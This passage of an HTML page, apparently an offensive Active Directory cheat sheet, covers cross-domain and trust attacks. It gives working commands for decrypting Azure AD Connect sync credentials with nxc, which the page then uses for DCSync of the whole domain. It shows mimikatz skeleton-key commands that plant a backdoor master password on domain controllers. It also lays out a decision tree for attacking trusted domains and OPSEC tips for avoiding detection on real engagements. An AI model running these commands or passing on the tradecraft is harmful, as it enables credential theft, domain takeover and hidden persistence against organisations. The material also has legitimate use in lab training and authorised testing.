+<p>Azure AD Connect synchronizes identities between on-prem AD and Entra ID. The AAD Connect server holds credentials that can be abused for cloud takeover:</p>
+<ul>
+<li>The DSRM-like account <code>MSOL_xxxxx</code> on the on-prem DC</li>
+<li>The cleartext password for AAD Connect&rsquo;s sync account, stored on the sync server</li>
+<li>Once compromised, can sync arbitrary password resets to Entra ID</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb aadconnect.<span class="nv">$DOMAIN</span> -u <span class="nv">$USER</span> -p <span class="nv">$PASS</span> -M adsyncdecrypt
+</span></span><span class="line"><span class="cl"><span class="c1">## Or aadinternals (PowerShell module)</span>
+</span></span></code></pre></div><p>Pull the MSOL credential, then use it for DCSync on the entire on-prem AD.</p>
+<h2 id="xii-skeleton-key-against-cross-domain" data-heading-permalink="true"><span class="heading-content">xii. Skeleton key against cross-domain</span>
+    <a class="heading-permalink" href="#xii-skeleton-key-against-cross-domain" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Once you have DA in a domain, the skeleton key (mimikatz) injects a backdoor master password into LSASS on every DC. Cross-trust attacks become easier because any password auth (including from foreign domains) accepts the skeleton.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">mimikatz # privilege::debug
+</span></span><span class="line"><span class="cl">mimikatz # misc::skeleton
+</span></span></code></pre></div><p>Master password defaults to &ldquo;mimikatz&rdquo;. Anyone in the domain can now auth as anyone else with that password. See <a href="https://jinpwn.dev/cheatsheets/active-directory/ad14-persistence/">Persistence</a>
+.</p>
+<h2 id="xiii-trust-direction-decision-tree" data-heading-permalink="true"><span class="heading-content">xiii. Trust direction decision tree</span>
+    <a class="heading-permalink" href="#xiii-trust-direction-decision-tree" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>You&rsquo;re in domain A, want to attack domain B:</p>
+<ol>
+<li><strong>A is parent of B</strong> (intra-forest, child-to-parent direction reversed): compromise B child first, then ExtraSIDs to A</li>
+<li><strong>A is child, attack parent</strong>: section iii, ExtraSIDs golden ticket</li>
+<li><strong>A and B in different forests, A trusts B</strong>: B users can auth to A, attack INTO A from B</li>
+<li><strong>A and B in different forests, A trusted by B</strong>: get foothold in A, foreign group memberships may help</li>
+<li><strong>Cross-forest with SID filtering, want full DA</strong>: harder, need the trust key (section vi/vii) or a FSP with high privs</li>
+</ol>
+<h2 id="xiv-opsec" data-heading-permalink="true"><span class="heading-content">xiv. OPSEC</span>
+    <a class="heading-permalink" href="#xiv-opsec" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<ul>
+<li>Golden tickets with ExtraSIDs are well-known IOCs, AD ATP / MDI flags them</li>
+<li>Trust key dumps generate Event 4662 on the trust object</li>
+<li>Cross-domain auth events (Event 4769 with cross-realm SPN) are noisy on monitored networks</li>
+</ul>
+<p>On real engagements, prefer foreign group membership chains over forged tickets when possible (looks like normal cross-domain auth). On HTB and labs, forge freely.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/active-directory/ad12-dcsync/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">DCSync</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/active-directory/ad14-persistence/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">Persistence</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
